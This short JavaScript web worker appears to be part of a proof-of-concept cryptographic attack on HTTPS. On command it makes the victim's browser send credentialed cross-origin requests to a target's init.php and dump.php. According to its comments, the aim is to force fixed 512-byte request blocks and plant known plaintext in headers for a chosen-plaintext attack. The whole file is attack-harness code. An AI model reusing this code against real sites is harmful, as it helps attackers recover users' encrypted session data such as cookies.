
function setPadding(url)
{
	var httpRequest = new XMLHttpRequest();
	httpRequest.open("GET", url + "/init.php", true);
	httpRequest.withCredentials = true;
	httpRequest.send();
}

function dumpHeaders(url)
{
	var httpRequest = new XMLHttpRequest();
	httpRequest.open("GET", url + "/dump.php", true);
	httpRequest.withCredentials = true;
	httpRequest.send();
}

self.onmessage = function(e) {
        command  = e.data.split("=")[0];
	url      = e.data.split("=")[1];

	if (command == "INIT") {
		/** Make request to init.php to assure 512-block requests and known plaintext */
		setPadding(url);
	} else if (command == "DUMP") {
		/** Request dump.php to assure we have stored known plaintext in the headers */
		dumpHeaders(url);
	}
}
